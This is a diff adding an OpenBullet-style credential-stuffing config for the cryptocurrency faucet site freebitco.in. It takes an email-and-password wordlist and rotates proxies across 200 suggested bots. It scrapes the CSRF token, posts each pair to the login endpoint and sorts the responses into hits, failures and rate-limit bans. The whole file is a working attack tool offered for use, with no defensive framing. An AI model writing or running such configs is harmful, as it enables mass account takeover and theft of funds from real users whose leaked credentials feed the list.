@@ -1,0 +1,52 @@
+[SETTINGS]
+{
+  "Name": "Freebitco.in",
+  "SuggestedBots": 200,
+  "LastModified": "2019-02-02T18:26:22.2886231+01:00",
+  "AdditionalInfo": "No Capture",
+  "Author": "1-EvilBear-1",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://freebitco.in/?op=signup_page" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<COOKIES(csrf_token)>" LR "" "" Recursive=FALSE -> VAR "TOKEN" "" "" 
+PARSE "<COOKIES(__cfduid)>" LR "" "" Recursive=FALSE -> VAR "TOKEN2" "" "" 
+REQUEST POST "https://freebitco.in/" AutoRedirect=FALSE 
+  CONTENT "csrf_token=<TOKEN>&op=login_new&btc_address=<USER>&password=<PASS>&tfa_code=" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  COOKIE "x-csrf-token: <TOKEN>" 
+  COOKIE "__cfduid: <TOKEN2>" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://freebitco.in" 
+  HEADER "referer: https://freebitco.in/?op=signup_page" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect login details" 
+    KEY "<SOURCE>" DoesNotContain "s:" 
+  KEYCHAIN Success OR 
+    KEY "s:" 
+  KEYCHAIN Ban OR 
+    KEY "Too many tries." 
